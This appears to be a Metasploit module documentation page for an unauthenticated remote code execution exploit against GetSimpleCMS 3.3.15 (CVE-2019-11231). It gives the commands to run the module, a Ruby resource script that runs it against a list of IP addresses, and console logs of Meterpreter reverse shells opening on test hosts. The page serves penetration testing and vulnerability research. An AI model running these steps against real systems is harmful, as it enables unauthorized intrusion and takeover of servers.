 

| Overview | Knowledge Base |
| -------- | -------------- |

## GetSimpleCMS Unauthenticated RCE

---

This module exploits a vulnerability found in GetSimpleCMS, which allows unauthenticated attackers to perform Remote Code Execution. An arbitrary file upload (PHPcode for example) vulnerability can be triggered by an authenticated user, however authentication can be bypassed by leaking the cms API key to target the session manager.

## Module Name

---

exploit/multi/http/getsimplecms_unauth_code_exec

## Authors

---

- truerand0m

## Platforms

---

php

## Module Ranking

---

**Excellent**

> The exploit will never crash the service. This is the case for SQL Injection, CMD execution, RFI, LFI, etc. No typical memory corruption exploits should be given this ranking unless there are extraordinary circumstances.

## Module Traits

---

## Related Pull Requests

---

GITHUB_OAUTH_TOKEN environment variable not set. [See how](https://help.github.com/articles/creating-an-access-token-for-command-line-use/)

## AttackerKB references

---

- [CVE-2019-11231](https://attackerkb.com/topics/CVE-2019-11231?referrer=msfconsole)

## References

---

- [CVE-2019-11231](https://nvd.nist.gov/vuln/detail/CVE-2019-11231)
- [https://ssd-disclosure.com/archives/3899/ssd-advisory-getcms-unauthenticated-remote-code-execution](https://ssd-disclosure.com/archives/3899/ssd-advisory-getcms-unauthenticated-remote-code-execution)

## Available Targets

---

- GetSimpleCMS 3.3.15 and before

## Required Options

---

- **RHOSTS:** The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html

## Basic Usage

---

**Using getsimplecms_unauth_code_exec against a single host**

Normally, you can use exploit/multi/http/getsimplecms_unauth_code_exec this way:

```
msf > use exploit/multi/http/getsimplecms_unauth_code_exec
msf exploit(getsimplecms_unauth_code_exec) > show targets
    ... a list of targets ...
msf exploit(getsimplecms_unauth_code_exec) > set TARGET target-id
msf exploit(getsimplecms_unauth_code_exec) > show options
    ... show and set options ...
msf exploit(getsimplecms_unauth_code_exec) > exploit
```

**Using getsimplecms_unauth_code_exec against multiple hosts**

But it looks like this is a remote exploit module, which means you can also engage multiple hosts.

First, create a list of IPs you wish to exploit with this module. One IP per line.

Second, set up a background payload listener. This payload should be the same as the one your getsimplecms_unauth_code_exec will be using:

1. Do: `use exploit/multi/handler`
2. Do: `set PAYLOAD [payload]`
3. Set other options required by the payload
4. Do: `set EXITONSESSION false`
5. Do: `run -j`

At this point, you should have a payload listening.

Next, create the following script. Notice you will probably need to modify the ip_list path, and payload options accordingly:

```
&#x3c;ruby&#x3e;
#
# Modify the path if necessary
#
ip_list = '/tmp/ip_list.txt'

File.open(ip_list, 'rb').each_line do |ip|
  print_status("Trying against #{ip}")
  run_single("use exploit/multi/http/getsimplecms_unauth_code_exec")
  run_single("set RHOST #{ip}")
  run_single("set DisablePayloadHandler true")

  #
  # Set a payload that's the same as the handler.
  # You might also need to add more run_single commands to configure other
  # payload options.
  #
  run_single("set PAYLOAD [payload name]")

  run_single("run")
end
&#x3c;/ruby&#x3e;
```

Next, run the resource script in the console:

```
msf > resource [path-to-resource-script]
```

And finally, you should see that the exploit is trying against those hosts similar to the following MS08-067 example:

```
msf > resource /tmp/exploit_hosts.rc
[*] Processing /tmp/exploit_hosts.rc for ERB directives.
[*] resource (/tmp/exploit_hosts.rc)> Ruby Code (402 bytes)
[*] Trying against 192.168.1.80

RHOST => 192.168.1.80
DisablePayloadHandler => true
PAYLOAD => windows/meterpreter/reverse_tcp
LHOST => 192.168.1.199

[*] 192.168.1.80:445 - Automatically detecting the target...
[*] 192.168.1.80:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 192.168.1.80:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 192.168.1.80:445 - Attempting to trigger the vulnerability...
[*] Sending stage (957999 bytes) to 192.168.1.80
[*] Trying against 192.168.1.109
RHOST => 192.168.1.109
DisablePayloadHandler => true
PAYLOAD => windows/meterpreter/reverse_tcp
LHOST => 192.168.1.199
[*] 192.168.1.109:445 - Automatically detecting the target...
[*] 192.168.1.109:445 - Fingerprint: Windows 2003 - Service Pack 2 - lang:Unknown
[*] 192.168.1.109:445 - We could not detect the language pack, defaulting to English
[*] 192.168.1.109:445 - Selected Target: Windows 2003 SP2 English (NX)
[*] 192.168.1.109:445 - Attempting to trigger the vulnerability...
[*] Meterpreter session 1 opened (192.168.1.199:4444 -> 192.168.1.80:1071) at 2016-03-02 19:32:49 -0600

[*] Sending stage (957999 bytes) to 192.168.1.109
[*] Meterpreter session 2 opened (192.168.1.199:4444 -> 192.168.1.109:4626) at 2016-03-02 19:32:52 -0600
```

## Description

---

This module exploits a vulnerability found in GetSimpleCMS, which allows unauthenticated attackers to perform Remote Code Execution. An arbitrary file upload vulnerability can be triggered by an authenticated user, however authentication can be bypassed by leaking the cms API key to target the session manager.

## Vulnerable Application

---

GetSimple CMS versions 3.3.15 and below

Vulnerable installations can be found [here](http://get-simple.info/)

## Verification Steps

---

1. Install the application
2. Start msfconsole
3. Do: `use exploit/multi/http/getsimplecms_unauth_code_exec`
4. Do: `set RHOSTS http://10.129.6.57`
5. Do: `run`
6. You should get a shell.

## Scenarios

---

### Tested on GetSimple CMS v3.3.15 on Ubuntu 18.04

---

```
  msf5 > use exploit/multi/http/getsimplecms_unauth_code_exec
  msf5 exploit(multi/http/getsimplecms_unauth_code_exec) > set rhosts 192.168.37.137
  rhosts => 192.168.37.137
  msf5 exploit(multi/http/getsimplecms_unauth_code_exec) > set verbose true
  verbose => true
  msf5 exploit(multi/http/getsimplecms_unauth_code_exec) > run

  [*] Started reverse TCP handler on 192.168.37.1:4444
  [*] GetSimpleCMS version 3315
  [*] Sending stage (38247 bytes) to 192.168.37.137
  [*] Meterpreter session 1 opened (192.168.37.1:4444 -> 192.168.37.137:32976) at 2019-05-16 11:22:39 -0500

  meterpreter > getuid
  Server username: www-data (33)
  meterpreter > sysinfo
  Computer    : ubuntu
  OS          : Linux ubuntu 4.18.0-16-generic #17~18.04.1-Ubuntu SMP Tue Feb 12 13:35:51 UTC 2019 x86_64
  Meterpreter : php/linux
  meterpreter >
```